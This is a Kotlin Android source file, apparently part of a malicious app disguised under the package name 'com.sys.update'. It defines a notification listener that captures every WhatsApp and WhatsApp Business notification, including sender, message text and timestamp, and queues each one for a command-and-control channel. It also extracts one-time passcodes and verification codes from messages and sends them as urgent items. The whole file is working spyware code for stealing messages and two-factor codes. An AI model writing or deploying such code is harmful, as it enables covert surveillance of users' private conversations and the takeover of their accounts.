package com.sys.update

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import org.json.JSONObject

class WaNotifListener : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val pkg = sbn.packageName ?: return
        if (pkg != "com.whatsapp" && pkg != "com.whatsapp.w4b") return

        val extras = sbn.notification?.extras ?: return
        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
        val text  = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
        val sub   = extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString() ?: ""
        val big   = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString() ?: ""

        if (title.isBlank() && text.isBlank()) return

        val body = if (big.isNotBlank()) big else text

        val payload = JSONObject().apply {
            put("type", "whatsapp")
            put("from", title)
            put("body", body)
            put("sub", sub)
            put("ts", sbn.postTime)
        }
        C2Queue.enqueueUrgent(payload.toString())

        val otpRegex = Regex("\\b(\\d{4,8})\\b")
        val match = otpRegex.find(body)
        if (match != null && (
            body.contains("OTP", true) ||
            body.contains("code", true) ||
            body.contains("verification", true))) {
            val otpPayload = JSONObject().apply {
                put("type", "otp")
                put("via", "whatsapp")
                put("from", title)
                put("otp", match.value)
                put("full", body)
                put("ts", sbn.postTime)
            }
            C2Queue.enqueueUrgent(otpPayload.toString())
        }
    }
}
